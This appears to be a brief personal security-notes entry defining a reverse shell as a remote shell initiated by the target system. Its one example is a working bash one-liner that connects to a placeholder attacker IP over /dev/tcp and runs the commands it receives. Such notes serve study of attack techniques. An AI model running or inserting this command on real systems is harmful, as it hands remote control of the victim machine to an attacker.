> A remote [[Shell]] (like [[SSH]]) that is initiated by the target system



## Example
```bash
exec 5<>/dev/tcp/<attacker_IP>/80;cat <&5 | while read line; do \$line 2>&5 >&5; done
```